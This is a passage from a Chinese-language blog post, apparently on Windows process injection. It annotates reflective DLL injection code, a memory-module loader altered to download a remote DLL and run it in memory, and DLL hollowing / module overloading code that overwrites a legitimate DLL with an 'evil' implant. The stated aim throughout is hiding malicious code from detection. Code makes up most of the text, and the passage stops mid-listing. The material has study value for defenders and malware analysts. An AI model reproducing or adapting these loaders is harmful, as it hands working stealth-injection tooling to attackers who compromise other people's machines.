class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>六、调用DLL入口点</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 获取DLL的入口点</span><br><span class=\"line\">uiValueA &#x3D; ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.AddressOfEntryPoint );</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 刷新指令缓存,确保CPU的指令缓存没有旧的代码</span><br><span class=\"line\">pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 调用DLLMAIN函数</span><br><span class=\"line\">&#x2F;&#x2F; 此宏定义表示,如果DLL是通过LoadRemoteLibraryR注入的,则可使用第三个参数作为额外参数给DllMain</span><br><span class=\"line\">#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</span><br><span class=\"line\"></span><br><span class=\"line\">((DLLMAIN)uiValueA)( (HINSTANCE), DLL_PROCESS_ATTACH, lpParameter );</span><br><span class=\"line\">#else</span><br><span class=\"line\">((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 返回入口点的地址</span><br><span class=\"line\">return uiValueA;</span><br></pre></td></tr></table></figure>\n\n<p>七、在DLLMAIN中添加恶意操作</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240617003529139.png\" alt=\"image-20240617003529139\"></p>\n<p>至此恶意DLL以及导出函数构造完成。</p>\n<p>下面分析注入器的流程：首先项目通过读取本地dll文件到内存，然后加载到内存，后续可以改造为远程下载或者嵌入即可实现单PE。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#ifdef WIN_X64</span><br><span class=\"line\">\tchar * cpDllFile  &#x3D; &quot;reflective_dll.x64.dll&quot;;</span><br><span class=\"line\">#else</span><br><span class=\"line\">#ifdef WIN_X86</span><br><span class=\"line\">\tchar * cpDllFile  &#x3D; &quot;reflective_dll.dll&quot;;</span><br><span class=\"line\">#else WIN_ARM</span><br><span class=\"line\">\tchar * cpDllFile  &#x3D; &quot;reflective_dll.arm.dll&quot;;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">....</span><br><span class=\"line\"></span><br><span class=\"line\">hFile &#x3D; CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );</span><br><span class=\"line\">if( hFile &#x3D;&#x3D; INVALID_HANDLE_VALUE )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to open the DLL file&quot; );</span><br><span class=\"line\"></span><br><span class=\"line\">dwLength &#x3D; GetFileSize( hFile, NULL );</span><br><span class=\"line\">if( dwLength &#x3D;&#x3D; INVALID_FILE_SIZE || dwLength &#x3D;&#x3D; 0 )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 开辟新空间</span><br><span class=\"line\">lpBuffer &#x3D; HeapAlloc( GetProcessHeap(), 0, dwLength );</span><br><span class=\"line\">if( !lpBuffer )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );</span><br><span class=\"line\">    </span><br><span class=\"line\">&#x2F;&#x2F; 将DLL读取到新空间中</span><br><span class=\"line\">if( ReadFile( hFile, lpBuffer, dwLength, &amp;dwBytesRead, NULL ) &#x3D;&#x3D; FALSE )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to alloc a buffer!&quot; );</span><br></pre></td></tr></table></figure>\n\n<p>提升当前进程权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    priv.PrivilegeCount           &#x3D; 1;</span><br><span class=\"line\">    priv.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\"></span><br><span class=\"line\">    if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;priv.Privileges[0].Luid ) )</span><br><span class=\"line\">        AdjustTokenPrivileges( hToken, FALSE, &amp;priv, 0, NULL, NULL );</span><br><span class=\"line\"></span><br><span class=\"line\">    CloseHandle( hToken );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>打开进程，通过 <strong>LoadRemoteLibraryR</strong> 将dll注入到目标进程中。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 打开目标进程</span><br><span class=\"line\">hProcess &#x3D; OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );</span><br><span class=\"line\">if( !hProcess )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to open the target process&quot; );</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 通过LoadRemoteLibraryR注入dll到进程中</span><br><span class=\"line\">hModule &#x3D; LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL );</span><br><span class=\"line\">if( !hModule )</span><br><span class=\"line\">    BREAK_WITH_ERROR( &quot;Failed to inject the DLL&quot; );</span><br><span class=\"line\"></span><br><span class=\"line\">printf( &quot;[+] Injected the &#39;%s&#39; DLL into process %d.&quot;, cpDllFile, dwProcessId );</span><br><span class=\"line\"></span><br><span class=\"line\">WaitForSingleObject( hModule, -1 );</span><br></pre></td></tr></table></figure>\n\n<p>来分析下 <strong>LoadRemoteLibraryR</strong> </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 通过GetReflectiveLoaderOffset找到ReflectiveLoader函数对应的偏移</span><br><span class=\"line\">dwReflectiveLoaderOffset &#x3D; GetReflectiveLoaderOffset( lpBuffer );</span><br><span class=\"line\">if( !dwReflectiveLoaderOffset )</span><br><span class=\"line\">\tbreak;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 在目标进程中开辟空间</span><br><span class=\"line\">lpRemoteLibraryBuffer &#x3D; VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); </span><br><span class=\"line\">if( !lpRemoteLibraryBuffer )</span><br><span class=\"line\">\tbreak;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 将恶意DLL写到目标进程中</span><br><span class=\"line\">if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) )</span><br><span class=\"line\">\tbreak;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 通过偏移找到ReflectiveLoader函数地址</span><br><span class=\"line\">lpReflectiveLoader &#x3D; (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 远程调用ReflectiveLoader</span><br><span class=\"line\">hThread &#x3D; CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId );</span><br></pre></td></tr></table></figure>\n\n<p>再分析 <strong>GetReflectiveLoaderOffset</strong> 是怎么找到DLL的ReflectiveLoader偏移。通过遍历DLL的导出表找到ReflectiveLoader，并计算出相对于DLL基地址的偏移量。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer )</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\tUINT_PTR uiBaseAddress   &#x3D; 0;</span><br><span class=\"line\">\tUINT_PTR uiExportDir     &#x3D; 0;</span><br><span class=\"line\">\tUINT_PTR uiNameArray     &#x3D; 0;</span><br><span class=\"line\">\tUINT_PTR uiAddressArray  &#x3D; 0;</span><br><span class=\"line\">\tUINT_PTR uiNameOrdinals  &#x3D; 0;</span><br><span class=\"line\">\tDWORD dwCounter          &#x3D; 0;</span><br><span class=\"line\">#ifdef WIN_X64</span><br><span class=\"line\">\tDWORD dwCompiledArch &#x3D; 2;</span><br><span class=\"line\">#else</span><br><span class=\"line\">\t&#x2F;&#x2F; This will catch Win32 and WinRT.</span><br><span class=\"line\">\tDWORD dwCompiledArch &#x3D; 1;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t</span><br><span class=\"line\">    &#x2F;&#x2F; uiBaseAddress初始化为dll的基址</span><br><span class=\"line\">\tuiBaseAddress &#x3D; (UINT_PTR)lpReflectiveDllBuffer;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取DLL的PE头</span><br><span class=\"line\">\tuiExportDir &#x3D; uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 检查DLL的架构(x32 or x64)</span><br><span class=\"line\">\tif( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic &#x3D;&#x3D; 0x010B ) &#x2F;&#x2F; PE32</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif( dwCompiledArch !&#x3D; 1 )</span><br><span class=\"line\">\t\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic &#x3D;&#x3D; 0x020B ) &#x2F;&#x2F; PE64</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif( dwCompiledArch !&#x3D; 2 )</span><br><span class=\"line\">\t\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 定位导出表</span><br><span class=\"line\">\tuiNameArray &#x3D; (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#x2F;&#x2F; 获取导出表在文件状态下的地址</span><br><span class=\"line\">\tuiExportDir &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取导出函数名称表在文件状态下的地址</span><br><span class=\"line\">\tuiNameArray &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取导出函数地址表在文件状态下的地址</span><br><span class=\"line\">\tuiAddressArray &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取导出函数序号表在文件状态下的地址</span><br><span class=\"line\">\tuiNameOrdinals &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取通过函数名称来导出的数量</span><br><span class=\"line\">\tdwCounter &#x3D; ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 遍历所有导出函数</span><br><span class=\"line\">\twhile( dwCounter-- )</span><br><span class=\"line\">\t&#123;\t</span><br><span class=\"line\">        &#x2F;&#x2F; 获取导出函数的名称</span><br><span class=\"line\">\t\tchar * cpExportedFunctionName &#x3D; (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">        &#x2F;&#x2F; 检查导出函数的名称是否是“ReflectiveLoader”</span><br><span class=\"line\">\t\tif( strstr( cpExportedFunctionName, &quot;ReflectiveLoader&quot; ) !&#x3D; NULL )</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 定位导出函数地址表</span><br><span class=\"line\">\t\t\tuiAddressArray &#x3D; uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; uiNameOrdinals提供ReflectiveLoader函数的序号，并通过此序号与导出函数地址表的起始位置计算,从而得出ReflectiveLoader函数的地址</span><br><span class=\"line\">\t\t\tuiAddressArray +&#x3D; ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#x2F;&#x2F; 返回ReflectiveLoader函数在文件状态下的偏移量</span><br><span class=\"line\">\t\t\treturn Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">        &#x2F;&#x2F; 指向下一个导出函数的名称</span><br><span class=\"line\">\t\tuiNameArray +&#x3D; sizeof(DWORD);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#x2F;&#x2F; 指向下一个导出函数的序号</span><br><span class=\"line\">\t\tuiNameOrdinals +&#x3D; sizeof(WORD);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>至此注入器分析完成。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240617012803371.png\" alt=\"image-20240617012803371\"></p>\n<p>最后该方法还有变形应用 <a href=\"https://idiotc4t.com/defense-evasion/reflectivedllinjection-variation#jian-jie\">ReflectiveDLLInjection变形应用</a>，更好的隐藏了特征。</p>\n<h2 id=\"Memory-Module\"><a href=\"#Memory-Module\" class=\"headerlink\" title=\"Memory Module\"></a>Memory Module</h2><p>memory module（内存模块）过程非常类似反射DLL加载，二者实现的都是模拟PE加载过程、在内存中加载dll，但是内存模块更为精细，主要差别为：一、反射dll直接将所有代码copy到目标的一片RWX的内存中，内存模块则是按照将不同节进行不同的标记，可以将没有用的节释放掉，因此内存模块在内存中表现的更像正常DLL的属性分布因此更具隐蔽性。二、反射dll所有操作都是由目标进程进行，内存模块操作由本身exe进行自身注入。具体参看项目：<a href=\"https://github.com/fancycode/MemoryModule\">https://github.com/fancycode/MemoryModule</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1719931962740.png\" alt=\"QQ_1719931962740\"></p>\n<p>反射DLL：会直接多出两片private的RWX属性内存。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240620105057906.png\" alt=\"image-20240620105057906\"></p>\n<p>内存模块：</p>\n<p>引入 <code>MemoryModule.h</code> 和 <code>MemoryModule.c</code> ，同时改造成远程拉取DLL到内存中。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include&lt;iostream&gt;</span><br><span class=\"line\">#include &lt;winsock2.h&gt;</span><br><span class=\"line\">#include&lt;Windows.h&gt;</span><br><span class=\"line\">#include&lt;string&gt;</span><br><span class=\"line\">#include &lt;tchar.h&gt;</span><br><span class=\"line\">#include &quot;MemoryModule.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(lib, &quot;ws2_32.lib&quot;)</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);</span><br><span class=\"line\"></span><br><span class=\"line\">char* readUrl(const char* szUrl, long&amp; fileSize)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   ......</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void LoadFromMemory(void)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    void* data;</span><br><span class=\"line\">    size_t size;</span><br><span class=\"line\">    HMEMORYMODULE handle;</span><br><span class=\"line\">    Module DllMain;</span><br><span class=\"line\">    long fileSize;</span><br><span class=\"line\"></span><br><span class=\"line\">    data &#x3D; (void *)readUrl(&quot;http:&#x2F;&#x2F;example.com&#x2F;test.dll&quot;,fileSize);</span><br><span class=\"line\">    if (data &#x3D;&#x3D; NULL)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;[-]Open DLL Fail&quot; &lt;&lt; endl;</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t&#x2F;&#x2F; 自动触发dllmain</span><br><span class=\"line\">    handle &#x3D; MemoryLoadLibrary(data, size);</span><br><span class=\"line\">    MemoryFreeLibrary(handle);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LoadFromMemory();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>内存分布还算正常，但还是存在显眼的 “private” RX内存。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240624150049093.png\" alt=\"image-20240624150049093\"></p>\n<p>PS：由于memory module的特点，项目无法做到直接与进程注入相结合，目前有一个与python相结合的项目 <a href=\"https://github.com/naksyn/PythonMemoryModule%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%AA%E6%9D%A5%E6%9C%89%E5%85%AC%E5%BC%80%E9%A1%B9%E7%9B%AE%E8%83%BD%E5%92%8C%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E7%9B%B8%E7%BB%93%E5%90%88%E5%B0%B1%E6%AF%94%E8%BE%83%E5%A5%BD%E4%BA%86\">https://github.com/naksyn/PythonMemoryModule，如果未来有公开项目能和进程注入相结合就比较好了</a></p>\n<h2 id=\"DLL-Hollowing\"><a href=\"#DLL-Hollowing\" class=\"headerlink\" title=\"DLL Hollowing\"></a>DLL Hollowing</h2><h3 id=\"内存类型\"><a href=\"#内存类型\" class=\"headerlink\" title=\"内存类型\"></a>内存类型</h3><p>在Windows虚拟内存管理中，通过 <strong>MEMORY_BASIC_INFORMATION</strong> 结构体描述某范围内内存块的具体信息：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">typedef struct _MEMORY_BASIC_INFORMATION &#123;</span><br><span class=\"line\">  PVOID  BaseAddress;\t\t&#x2F;&#x2F;指向查询的内存区域的起始地址</span><br><span class=\"line\">  PVOID  AllocationBase;\t&#x2F;&#x2F;指向分配的内存块的起始地址。 BaseAddress 成员指向的页面包含在此分配范围内。</span><br><span class=\"line\">  DWORD  AllocationProtect;\t&#x2F;&#x2F;分配时的内存保护属性。例如，PAGE_READONLY、PAGE_READWRITE 等</span><br><span class=\"line\">  WORD   PartitionId;\t\t&#x2F;&#x2F;标识内存区域所属的分区 ID, Win10引入</span><br><span class=\"line\">  SIZE_T RegionSize;\t\t&#x2F;&#x2F;从基址开始的区域大小，其中所有页面都具有相同的属性（以字节为单位）</span><br><span class=\"line\">  DWORD  State;\t\t\t\t&#x2F;&#x2F;内存块的当前状态。 MEM_COMMIT（已提交）、MEM_RESERVE（已保留）和 MEM_FREE（空闲）</span><br><span class=\"line\">  DWORD  Protect;\t\t\t&#x2F;&#x2F;内存块的当前保护属性。可能的值包括 PAGE_NOACCESS、PAGE_READONLY、PAGE_READWRITE 等</span><br><span class=\"line\">  DWORD  Type;\t\t\t\t&#x2F;&#x2F;内存块的类型。可能的值包括 MEM_IMAGE、MEM_MAPPED和 MEM_PRIVATE</span><br><span class=\"line\">&#125; MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;</span><br></pre></td></tr></table></figure>\n\n<p>在打开SystemInformer.exe查看内存区域时，可对应内存块类型的三种commit：<strong>Private、Mapped、Image</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1719989713022.png\" alt=\"QQ_1719989713022\"></p>\n<p>这三种内存块类型的差异主要为：</p>\n<ul>\n<li><p>Private：标识内存块是由进程私有使用的，通常由内存分配函数（如 VirtualAlloc）分配</p>\n</li>\n<li><p>Image：在系统加载运行可执行文件时，标识加载到内存中的可执行文件（PE）和所需动态链接库（DLL）的映像文件，其对应的RX区域为.text段</p>\n</li>\n<li><p>Mapped：标识内存块是通过内存映射文件（memory-mapped files）分配的。这些内存块与磁盘上的文件内容直接关联如：</p>\n<p>.db、.mui和.dat文件从磁盘映射到内存中供应用程序读取</p>\n</li>\n</ul>\n<hr>\n<p>在了解内存块类型差异后，结合前面几种技术所展现的 <strong>Private</strong> 内存类型的明显特征，思考如果将恶意代码隐藏到另外两种内存类型（Mapped或Image）中，是不是就会有较好的隐匿效果呢？DLL Hollowing就是这样的一种技术，其主要思路为：<strong>在目标进程内主动加载一个系统中合法的dll，此时对应内存类型为：Image，然后将dll对应的内存内容覆写为恶意代码，通过执行入口点函数/PE加载 启动恶意代码，同时由于使用了 LoadLibrary系列API、文件映射等手段，避免了使用 VirtualAllocEx,WriteProcessMemory等敏感API</strong></p>\n<p>另外在实现此技术时应该注意以下几点：</p>\n<ul>\n<li>其IMAGE_SECTION_HEADER.Misc.VirtualSize大于或等于被植入的 shellcode 的大小</li>\n<li>此类 DLL 不应加载到目标进程中，因为这意味着它们的修改可能会导致崩溃</li>\n</ul>\n<p>很符合 “镂空” 这个词 :)，我将此分为五部分：</p>\n<ul>\n<li>经典Dll Hollowing</li>\n<li>Module Overloading</li>\n<li>Module Stomping</li>\n<li>bypass cfg</li>\n<li>远程注入</li>\n</ul>\n<h3 id=\"经典Dll-Hollowing\"><a href=\"#经典Dll-Hollowing\" class=\"headerlink\" title=\"经典Dll Hollowing\"></a>经典Dll Hollowing</h3><p>此处和Module Overloading的学习直接分析项目：<a href=\"https://github.com/hasherezade/module_overloading%EF%BC%8C%E6%AD%A4%E9%A1%B9%E7%9B%AE%E9%80%9A%E8%BF%87libPeConv%E5%BA%93%E4%B8%93%E9%97%A8%E7%94%A8%E4%BA%8E%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%93%8D%E4%BD%9CPE\">https://github.com/hasherezade/module_overloading，此项目通过libPeConv库专门用于加载和操作PE</a></p>\n<p>特点：通过 <strong>LoadLibraryA/LoadLibraryEx 引入合法Dll，原项目使用LoadLibraryA，这里修改为LoadLibraryEx，只加载Dll但不执行Dllmain函数</strong></p>\n<p>首先将evil PE（implant_name），完整内容copy到buffer中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\t&#x2F;&#x2F; tapi32.dll</span><br><span class=\"line\">\tstd::cout &lt;&lt; &quot;target_dll: &quot; &lt;&lt; dll_name &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">\t&#x2F;&#x2F; evil code</span><br><span class=\"line\">\tstd::cout &lt;&lt; &quot;implant_dll: &quot; &lt;&lt; implant_name &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tsize_t raw_size &#x3D; 0;</span><br><span class=\"line\">\t&#x2F;&#x2F; 将evil code的文件原始内容分配到buffer中</span><br><span class=\"line\">\tBYTE *raw_payload &#x3D; peconv::load_file(implant_name, raw_size);</span><br><span class=\"line\"></span><br><span class=\"line\">#ifdef _DEBUG</span><br><span class=\"line\">\tstd::cerr &lt;&lt; &quot;[+] Raw implant loaded\\n&quot;;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t&#x2F;&#x2F; 判断符合系统位数</span><br><span class=\"line\">\tif (!is_compatibile(raw_payload)) &#123;</span><br><span class=\"line\">\t\tsystem(&quot;pause&quot;);</span><br><span class=\"line\">\t\treturn -1;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>开始镂空（module_overloader）通过将PE映射到内存，处理导入导出表后，将合法Dll内存覆写。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 模块重载</span><br><span class=\"line\">LPVOID mapped &#x3D; module_overloader(raw_payload, raw_size, dll_name);</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">PVOID module_overloader(BYTE* raw_payload, size_t raw_size, char *target_dll)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 将 PE 从给定缓冲区加载到内存将其映射为虚拟格式</span><br><span class=\"line\">\tBYTE* payload &#x3D; peconv::load_pe_module(raw_payload, raw_size, payload_size, false, false);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 加载payload导入表</span><br><span class=\"line\">\tpeconv::load_imports(payload)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; 通过 *LoadLibraryEx* 返回Dll地址</span><br><span class=\"line\">\tPVOID mapped &#x3D; load_target_dll(target_dll);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; Relocate the payload into the target base:</span><br><span class=\"line\">\t&#x2F;&#x2F; payload到Dll地址重定向问题</span><br><span class=\"line\">\tpeconv::relocate_module(payload, payload_size, (ULONGLONG)mapped)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F; Overwrite the target DLL with the payload</span><br><span class=\"line\">\t&#x2F;&#x2F; 将payload覆盖到Dll内</span><br><span class=\"line\">\toverwrite_mapping(mapped, payload, payload_size)</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn mapped;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">&#x2F;&#x2F;覆盖Dll：overwrite_mapping</span><br><span class=\"line\">bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHANDLE hProcess &#x3D; GetCurrentProcess();</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#x2F;&#x2F;cleanup previous module:</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tsize_t prev_size &#x3D; peconv::get_image_size((BYTE*)mapped);</span><br><span class=\"line\">\t&#x2F;&#x2F;将Dll全部置0</span><br><span class=\"line\">\tif (prev_size) &#123;</span><br><span class=\"line\">\t\tif (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READWRITE, &amp;oldProtect)) return false;</span><br><span class=\"line\">\t\tmemset(mapped, 0, prev_size);</span><br><span class=\"line\">\t\tif (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READONLY, &amp;oldProtect)) return false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_READWRITE, &amp;oldProtect)) &#123;</span><br><span class=\"line\">\t\t&#x2F;&#x2F; 判断加载Dll的内存大小与evil code大小，后者不能比前者大</span><br><span class=\"line\">\t\tif (implant_size &gt; prev_size) &#123;</span><br><span class=\"line\">\t\t\tstd::cout &lt;&lt; &quot;[-] The implant is too big for the target!\\n&quot;;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t&#x2F;&#x2F; 由于二者都已经映像了，所以直接将evil code 复制过去</span><br><span class=\"line\">\tmemcpy(mapped, implant_dll, implant_size);</span><br><span class=\"line\">\tis_ok &#x3D; true;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 设置各个节的正确权限属性</span><br><span class=\"line\">\tif (!set_sections_access(mapped, implant_dll, implant_size)) &#123;</span><br><span class=\"line\">\t\tis_ok &#x3D; false;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn is_ok;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在镂空重写后，获取偏移，执行入口点 :)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 获取evil code到入口点的RVA</span><br><span class=\"line\">DWORD ep_rva &#x3D; peconv::get_entry_point_rva(raw_payload);</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 检查evil code是不是Dll</span><br><span class=\"line\">bool is_dll &#x3D; peconv::is_module_dll(raw_payload);</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 释放原始evil code</span><br><span class=\"line\">peconv::free_file(raw_payload); raw_payload &#x3D; nullptr;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 执行payload</span><br><span 